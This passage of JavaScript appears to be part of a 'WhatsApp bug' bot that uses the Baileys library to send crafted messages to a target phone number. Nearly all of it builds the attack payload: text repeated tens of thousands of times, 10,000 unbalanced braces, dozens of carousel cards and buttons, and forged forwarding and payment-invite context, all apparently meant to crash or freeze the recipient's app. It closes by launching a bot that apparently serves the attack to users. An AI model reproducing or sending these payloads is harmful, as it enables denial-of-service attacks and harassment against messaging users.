       streamingSidecar: "ypvxlTyuR3uzb1giNyNVUaHeJ40v9lL2IjwfM8njf+m2lvqWGcKb6L6IRiH6TiajAWpnj2z4ZsC6klWL6l2NkB65g8U+qXMyjADFSGOuG9LBI/jmx7h9vlpXjSgxZOLVy29HBS2vhjj8V1IglDR47GrAz0UZqcDuotGa/vJmSg5lKMpxxJqzvJth0h4spVX2pcH2aIVZnWkaHh2a+7BukY6hXN1A/or+VvhZyauto6anYMWAcnACcWP9dyBKYa1B7Ss7Vnu86uqUbQmyyNgePCipB9sundP9iq4RHBiR1RxFfrv990U+hYUPE0kbBtD1zfK9x+gmf1I9Cav0sP64xnWQ8TrhalUjTE2mVFfQqn8ZkY4IKwOpOgWzacImLK6j0Pj78jyibNShmDBlmG61QOMKfwVW4ZDw3M7kI1/1TJ3uKBXYzLlAs36BowfErSIrgEbU+OSA1g2Ay4qwH+k5mjkOLVnW3dshIjCdxsHUTTLQpQGnBrh+sARmOWL8UHjJOKCh/7lQZqx3Vv7ZOt13ry44AR2aRPEO7VkYpX4oOWhKyjJIgHpZXPddrZLL3s/yGVecfpP9F80HfuB5ieery0Ai0klbruXlB9JDrd2w2477587Djifcsqqdqwurc6DTvWaEaTZTCsHMAyuQCOLIoTY0fWvotA7oIW/eVYb8LwdJzjzVbswVl4XoWkc+nJBKJFcQ7PE/kRKe6aWyqARaY/XxPUmLrEWPrqLbn1yY8a6yICH2dmq+3Sf5"
    },
    hasMediaAttachment: false,
    body: {
      text: "$",
    },
  };

  const buttonsCommon = [
    { name: "single_select", buttonParamsJson: "" },
    { name: "cta_call", buttonParamsJson: JSON.stringify({ status: true }) },
    { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ê¦½".repeat(5000) }) },
    { name: "quick_reply", buttonParamsJson: JSON.stringify({ display_text: "ê¦½".repeat(5000) }) },
  ];

  const buttonsLocation = [];
  for (let i = 0; i < 50; i++) {
    buttonsLocation.push(
      { name: "cta_copy", buttonParamsJson: JSON.stringify({ display_text: "ê¦½".repeat(5000) }) },
      { name: "galaxy_message", buttonParamsJson: JSON.stringify({ "icon": "RIVIEW","flow_cta": "$","flow_message_version": "3" }) },
    );
  }

  let msgContent;
  if (type === 'video') {
    for (let r = 0; r < 35; r++) {
      cards.push({
        header,
        nativeFlowMessage: {
          messageParamsJson: "{".repeat(10000),
          buttons: buttonsCommon,
        },
      });
    }

    msgContent = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "âƒŸê™° " +
                "áŸ„áŸ".repeat(10000) +
                "ê¦½".repeat(25000),
            },
            carouselMessage: {
              cards,
              messageVersion: 1,
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net",
              },
              stanzaId: "1234567890ABCDEF",
              forwardingScore: 100,
              isForwarded: true,
              participant: "13135550002@s.whatsapp.net",
              mentionedJid: ["13135550002@s.whatsapp.net"],
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 3,
                  expiryTimestamp: Date.now() + 1814400000,
                },
              },
            },
          },
        },
      },
    };
  } else if (type === 'location') {
    msgContent = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "ê¦½".repeat(25000),
              locationMessage: {
                degreesLatitude: 1e5,
                degreesLongtitude: 1e5,
                isLive: true,
                accuracyInMeters: 1e5,
              },
              hasMediaAttachment: true,
            },
            body: {
              text: "&" +
                "áŸ„áŸ".repeat(20000) +
                "ê¦½".repeat(25000),
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
              buttons: buttonsLocation,
            },
            contextInfo: {
              remoteJid: "X",
              participant: "13135550202@s.whatsapp.net",
              fromMe: false,
              expiration: 7205,
              ephemeralSettingTimestamp: 2502,
              disappearingMode: {
                initiator: "INITIATED_BY_OTHER",
                trigger: "ACCOUNT_SETTING"
              },
              quotedMessage: {
                paymentInviteMessage: {
                  serviceType: 1,
                  expiryTimestamp: 7205,
                },
              },
            },
          },
        },
      },
    };
  } else {
    throw new Error('error');
  }

  const msg = await generateWAMessageFromContent(target, msgContent, {});

  await sock.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}

//============( END ) =======\\
bot.launch()
